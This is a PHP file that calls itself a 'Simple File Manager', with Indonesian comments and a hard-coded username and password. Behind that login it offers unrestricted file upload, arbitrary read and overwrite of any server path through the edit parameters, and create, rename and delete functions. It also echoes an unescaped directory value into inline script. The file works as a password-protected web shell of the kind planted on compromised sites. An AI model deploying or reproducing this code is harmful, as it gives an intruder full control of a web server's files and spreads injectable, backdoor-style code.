<?php
session_start();

// Fungsi untuk memeriksa apakah user telah login
function isLoggedIn() {
    return isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true;
}

// Fungsi untuk login
function login($username, $password) {
    // Ganti dengan username dan password yang diinginkan
    $valid_username = "nengnut";
    $valid_password = "selamanya";

    if ($username === $valid_username && $password === $valid_password) {
        $_SESSION['loggedin'] = true;
        return true;
    }
    return false;
}

// Fungsi untuk logout
function logout() {
    session_destroy();
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}

// Fungsi untuk membuat folder
function createFolder($folderName) {
    if (!is_dir($folderName)) {
        mkdir($folderName);
    }
}

// Fungsi untuk membuat file
function createFile($fileName) {
    if (!file_exists($fileName)) {
        fopen($fileName, "w");
    }
}

// Fungsi untuk upload file
function uploadFile($file, $currentDir) {
    $target_dir = $currentDir . "/";
    $target_file = $target_dir . basename($file["name"]);
    move_uploaded_file($file["tmp_name"], $target_file);
}

// Fungsi untuk rename file atau folder
function renameItem($oldName, $newName) {
    if (file_exists($oldName)) {
        rename($oldName, $newName);
    }
}

// Fungsi untuk delete file atau folder
function deleteItem($itemName) {
    if (is_dir($itemName)) {
        rmdir($itemName);
    } else {
        unlink($itemName);
    }
}

// Fungsi untuk edit file
function editFile($fileName, $content) {
    file_put_contents($fileName, $content);
}

// Handle permintaan POST
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    if (isset($_POST['login'])) {
        $username = $_POST['username'];
        $password = $_POST['password'];

        if (login($username, $password)) {
            header("Location: " . $_SERVER['PHP_SELF']);
            exit;
        } else {
            $error = "Username atau password salah!";
        }
    } elseif (isset($_POST['logout'])) {
        logout();
    } elseif (isLoggedIn()) {
        $currentDir = isset($_GET['dir']) ? $_GET['dir'] : '.';
        $fullPathCurrentDir = realpath($currentDir); // Resolusi path absolut
        $action = '';

        if (isset($_POST['create_folder'])) {
            createFolder($fullPathCurrentDir . DIRECTORY_SEPARATOR . $_POST['folder_name']);
            $action = 'Folder created';
        } elseif (isset($_POST['create_file'])) {
            createFile($fullPathCurrentDir . DIRECTORY_SEPARATOR . $_POST['file_name']);
            $action = 'File created';
        } elseif (isset($_POST['upload_file'])) {
            uploadFile($_FILES['file_to_upload'], $fullPathCurrentDir);
            $action = 'File uploaded';
        } elseif (isset($_POST['rename_item'])) {
            $oldName = $fullPathCurrentDir . DIRECTORY_SEPARATOR . $_POST['old_name'];
            $newName = $fullPathCurrentDir . DIRECTORY_SEPARATOR . $_POST['new_name'];
            renameItem($oldName, $newName);
            $action = 'Item renamed';
        } elseif (isset($_POST['delete_item'])) {
            $itemName = $fullPathCurrentDir . DIRECTORY_SEPARATOR . $_POST['item_name'];
            deleteItem($itemName);
            $action = 'Item deleted';
        } elseif (isset($_POST['edit_file'])) {
            editFile($_POST['file_name'], $_POST['file_content']);
            $action = 'File edited';
        }

        // Redirect with alert
        echo "<script>
            Swal.fire({
                icon: 'success',
                title: '$action',
                showConfirmButton: false,
                timer: 1500
            }).then(() => {
                window.location.href = window.location.href.split('?')[0] + '?dir=" . urlencode($currentDir) . "';
            });
        </script>";
    }
}

// Tentukan direktori saat ini
$currentDir = isset($_GET['dir']) ? $_GET['dir'] : '.';
$fullPathCurrentDir = realpath($currentDir); // Resolusi path absolut

// Pastikan direktori tidak kosong sebelum melakukan scandir()
$items = $fullPathCurrentDir ? scandir($fullPathCurrentDir) : [];

// Fungsi untuk membuat breadcrumb
function createBreadcrumb($currentDir) {
    $root = $_SERVER['DOCUMENT_ROOT'];
    $currentDir = realpath($currentDir);
    $path_parts = explode(DIRECTORY_SEPARATOR, $currentDir);
    $path_display = "";
    $breadcrumb = 'Directory: ';

    foreach ($path_parts as $index => $path_part) {
        if ($index > 0) {
            $path_display .= DIRECTORY_SEPARATOR;
        }
        $path_display .= $path_part;
        $breadcrumb .= '<a href="?dir=' . urlencode(str_replace($root, '', $path_display)) . '">' . htmlspecialchars($path_part) . '</a> ➜ ';
    }

    return rtrim($breadcrumb, ' ➜ ');
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Simple File Manager</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link href="https://cdn.jsdelivr.net/npm/sweetalert2@11/dist/sweetalert2.min.css" rel="stylesheet">
    <style>
        .modal-dialog {
            max-width: 80%;
        }
    </style>
</head>
<body>

<?php if (!isLoggedIn()): ?>
    <div class="container mt-5">
        <div class="row justify-content-center">
            <div class="col-md-6">
                <div class="card">
                    <div class="card-header text-center">
                        Login
                    </div>
                    <div class="card-body">
                        <?php if (isset($error)): ?>
                            <div class="alert alert-danger">
                                <?php echo $error; ?>
                            </div>
                        <?php endif; ?>
                        <form method="POST">
                            <div class="mb-3">
                                <label for="username" class="form-label">Username</label>
                                <input type="text" class="form-control" id="username" name="username" required>
                            </div>
                            <div class="mb-3">
                                <label for="password" class="form-label">Password</label>
                                <input type="password" class="form-control" id="password" name="password" required>
                            </div>
                            <button type="submit" class="btn btn-primary" name="login">Login</button>
                        </form>
                    </div>
                </div>
            </div>
        </div>
    </div>
<?php else: ?>
<nav class="navbar navbar-expand-lg navbar-light bg-light">
    <div class="container-fluid">
        <a class="navbar-brand" href="#">File Manager</a>
        <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation">
            <span class="navbar-toggler-icon"></span>
        </button>
        <div class="collapse navbar-collapse" id="navbarNav">
            <ul class="navbar-nav me-auto mb-2 mb-lg-0">
                <li class="nav-item">
                    <form class="d-flex" method="POST">
                        <input class="form-control me-2" type="text" name="folder_name" placeholder="New Folder Name">
                        <button class="btn btn-outline-success" type="submit" name="create_folder">Create Folder</button>
                    </form>
                </li>
                <li class="nav-item">
                    <form class="d-flex" method="POST">
                        <input class="form-control me-2" type="text" name="file_name" placeholder="New File Name">
                        <button class="btn btn-outline-primary" type="submit" name="create_file">Create File</button>
                    </form>
                </li>
                <li class="nav-item">
                    <form class="d-flex" method="POST" enctype="multipart/form-data">
                        <input class="form-control me-2" type="file" name="file_to_upload">
                        <button class="btn btn-outline-warning" type="submit" name="upload_file">Upload File</button>
                    </form>
                </li>
            </ul>
            <form method="POST" class="d-flex">
                <button class="btn btn-outline-danger" type="submit" name="logout">Logout</button>
            </form>
        </div>
    </div>
</nav>

<div class="container mt-4">
    <nav aria-label="breadcrumb">
        <ol class="breadcrumb">
            <li class="breadcrumb-item"><?php echo createBreadcrumb($currentDir); ?></li>
        </ol>
    </nav>
    <div class="table-responsive">
        <table class="table table-hover">
            <thead>
                <tr>
                    <th>Item Name</th>
                    <th>Actions</th>
                </tr>
            </thead>
            <tbody>
                <?php 
                $directories = [];
                $files = [];
                foreach ($items as $item): 
                    if ($item != '.' && $item != '..'): 
                        if (is_dir($fullPathCurrentDir . DIRECTORY_SEPARATOR . $item)) {
                            $directories[] = $item;
                        } else {
                            $files[] = $item;
                        }
                    endif; 
                endforeach;

                foreach ($directories as $dir): ?>
                    <tr>
                        <td>
                            <a href="?dir=<?php echo urlencode($currentDir . DIRECTORY_SEPARATOR . $dir); ?>">
                                <?php echo htmlspecialchars($dir); ?>
                            </a>
                        </td>
                        <td>
                            <form method="POST" class="d-inline-block">
                                <input type="hidden" name="item_name" value="<?php echo htmlspecialchars($dir); ?>">
                                <button class="btn btn-outline-danger" type="submit" name="delete_item" onclick="return confirm('Are you sure you want to delete this folder?');">Delete</button>
                            </form>
                            <form method="POST" class="d-inline-block">
                                <input type="hidden" name="old_name" value="<?php echo htmlspecialchars($dir); ?>">
                                <input type="text" name="new_name" placeholder="New Name" class="form-control d-inline-block" style="width: auto;">
                                <button class="btn btn-outline-secondary" type="submit" name="rename_item">Rename</button>
                            </form>
                        </td>
                    </tr>
                <?php endforeach; ?>

                <?php foreach ($files as $file): ?>
                    <tr>
                        <td><?php echo htmlspecialchars($file); ?></td>
                        <td>
                            <form method="POST" class="d-inline-block">
                                <input type="hidden" name="item_name" value="<?php echo htmlspecialchars($file); ?>">
                                <button class="btn btn-outline-danger" type="submit" name="delete_item" onclick="return confirm('Are you sure you want to delete this file?');">Delete</button>
                            </form>
                            <form method="POST" class="d-inline-block">
                                <input type="hidden" name="old_name" value="<?php echo htmlspecialchars($file); ?>">
                                <input type="text" name="new_name" placeholder="New Name" class="form-control d-inline-block" style="width: auto;">
                                <button class="btn btn-outline-secondary" type="submit" name="rename_item">Rename</button>
                            </form>
                            <a href="?edit=<?php echo urlencode($fullPathCurrentDir . DIRECTORY_SEPARATOR . $file); ?>&dir=<?php echo urlencode($currentDir); ?>" class="btn btn-outline-info">Edit</a>
                        </td>
                    </tr>
                <?php endforeach; ?>
            </tbody>
        </table>
    </div>
</div>

<?php if (isset($_GET['edit'])): ?>
    <div class="modal fade" id="editFileModal" tabindex="-1" aria-labelledby="editFileLabel" aria-hidden="true">
        <div class="modal-dialog modal-lg">
            <div class="modal-content">
                <div class="modal-header">
                    <h5 class="modal-title" id="editFileLabel">Edit File: <?php echo basename($_GET['edit']); ?></h5>
                    <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
                </div>
                <div class="modal-body">
                    <form method="POST">
                        <input type="hidden" name="file_name" value="<?php echo htmlspecialchars($_GET['edit']); ?>">
                        <textarea class="form-control" name="file_content" rows="10"><?php echo htmlspecialchars(file_get_contents($_GET['edit'])); ?></textarea>
                </div>
                <div class="modal-footer">
                    <button type="submit" class="btn btn-primary" name="edit_file">Save changes</button>
                    <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
                </div>
                    </form>
                </div>
            </div>
        </div>
        <script>
            document.addEventListener('DOMContentLoaded', function () {
                var editModal = new bootstrap.Modal(document.getElementById('editFileModal'));
                editModal.show();
            });
        </script>
<?php endif; ?>

<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
<script>
    document.addEventListener('DOMContentLoaded', function () {
        <?php if (isset($action)): ?>
            Swal.fire({
                icon: 'success',
                title: '<?php echo $action; ?>',
                showConfirmButton: false,
                timer: 1500
            }).then(() => {
                window.location.href = window.location.href.split('?')[0] + '?dir=' + encodeURIComponent('<?php echo $currentDir; ?>');
            });
        <?php endif; ?>
    });
</script>
<?php endif; ?>
</body>
</html>